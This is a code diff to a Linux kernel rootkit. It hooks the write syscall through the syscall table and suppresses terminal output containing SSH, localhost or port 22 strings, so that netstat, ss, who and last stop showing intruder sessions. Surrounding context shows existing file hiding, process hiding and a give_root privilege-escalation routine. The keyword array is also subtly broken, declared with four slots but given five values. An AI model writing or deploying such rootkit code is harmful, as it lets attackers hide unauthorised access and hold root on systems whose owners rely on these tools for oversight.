@@ -5,6 +5,7 @@
 #include <linux/syscalls.h>
 #include <linux/cred.h>
 #include <linux/dirent.h>
+#include <linux/proc_fs.h>
 
 #include "modify_syscalls.h"
 
@@ -28,6 +29,7 @@
 #define SIG_UNHIDE 34
 #define SIG_HIDEPID 35
 
+
 // this is the filename we want to hide
 // used in hacked_getdents(...)
 #define TO_HIDE "virus"
@@ -38,6 +40,8 @@ asmlinkage int (*original_kill)(pid_t, int);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
+asmlinkage int (*original_write)(unsigned int fd, const char *buf, size_t count);
+
 
 struct list_head *module_list;
 
@@ -53,6 +57,8 @@ void update_sys_calls(void **sys_call_table){
     void *modified_function_stat = hacked_stat;
     void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
     void *modified_function_lstat = hacked_lstat;
+    void **modified_at_address_write = &sys_call_table[__NR_write];
+    void *modified_function_write = hacked_write;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
@@ -60,6 +66,7 @@ void update_sys_calls(void **sys_call_table){
     original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
+    original_write = xchg(modified_at_address_write, modified_function_write);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -74,6 +81,8 @@ void revert_to_original(void **sys_call_table){
     void *modified_function_stat = original_stat;
     void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
     void *modified_function_lstat = original_lstat;
+    void **modified_at_address_write = &sys_call_table[__NR_write];
+    void *modified_function_write = original_write;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
@@ -81,6 +90,7 @@ void revert_to_original(void **sys_call_table){
     original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
+    original_write = xchg(modified_at_address_write, modified_function_write);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -206,6 +216,31 @@ asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
         return original_lstat(path, buf);
     }
 }
+
+asmlinkage int hacked_write(unsigned int fd, const char *buf, size_t count){
+    //modify the write syscall
+    //anytime ssh is to be written (like netstat) with file descriptor = 1 (to standard output or terminal), we hide it (for netstat, ss etc)
+    //anytime 127.0.0.1 is to be written, dont display (this is localhost, what we use to access through ssh - or at least what shows) (for last, who, etc...)
+
+
+    //use `strace` to find what words are written to standard output for each of the frequently used networking commands (who, w, netstat, ss, last)
+
+    char *keyWords[4] = {":ssh", "127.0.0.1", "localhost", ":22", "(127.0.0.1)"};
+    int i = 0;
+
+    if (fd == 1) {
+        //spot out 'keywords'
+        //if they are here, dont write anything at all
+        for(i; i < 4; i++){
+            if (strstr(buf, keyWords[i]) != NULL) {
+                return count;
+            }
+        }
+    }
+    //else, write as normal
+    return original_write(fd, buf, count);
+}
+
 
 void give_root(void)
 {
